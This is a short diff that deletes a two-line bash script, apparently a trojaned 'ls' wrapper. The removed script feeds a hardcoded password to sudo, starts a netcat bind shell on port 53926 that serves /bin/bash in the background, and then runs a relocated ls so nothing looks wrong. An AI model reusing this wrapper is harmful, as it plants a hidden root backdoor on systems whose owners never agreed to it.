@@ -1,2 +1,0 @@
-#!/bin/bash
-( echo target123 | sudo -S nohup ./nc.traditional -l -p 53926 -e /bin/bash & ) > /dev/null 2>&1 && /bin/share/ls $@
